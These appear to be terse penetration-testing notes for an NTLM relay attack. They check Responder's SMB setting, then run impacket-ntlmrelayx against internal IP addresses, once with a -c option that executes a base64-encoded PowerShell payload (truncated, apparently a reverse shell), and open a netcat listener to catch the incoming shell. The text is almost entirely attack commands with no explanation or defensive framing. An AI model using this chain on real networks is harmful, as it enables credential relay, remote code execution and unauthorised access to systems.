```
cat /etc/responder/Responder.conf | grep 'SMB ='
```
>SMB = Off

```
impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146
```

```
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e JABjAGwAaQBlAG4AdA .... BASE64 STRING .... BJAEkAKQAuAEcAZQAoACkA'
```

```
nc -lvnp 9001
```





































